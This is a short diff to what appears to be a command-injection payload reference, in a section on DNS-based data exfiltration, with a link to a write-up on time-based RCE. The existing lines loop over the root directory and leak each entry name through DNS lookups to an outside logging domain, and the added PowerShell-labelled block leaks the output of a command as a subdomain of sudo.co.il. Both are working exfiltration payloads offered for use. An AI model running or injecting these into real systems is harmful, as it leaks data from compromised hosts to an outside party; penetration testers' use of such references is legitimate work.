@@ -152,6 +152,10 @@ Based on the tool from `https://github.com/HoLyVieR/dnsbin` also hosted at dnsbi
 for i in $(ls /) ; do host "http://$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 ```
 
+```powershell
+$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
+```
+
 ## Thanks to
 
 * [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
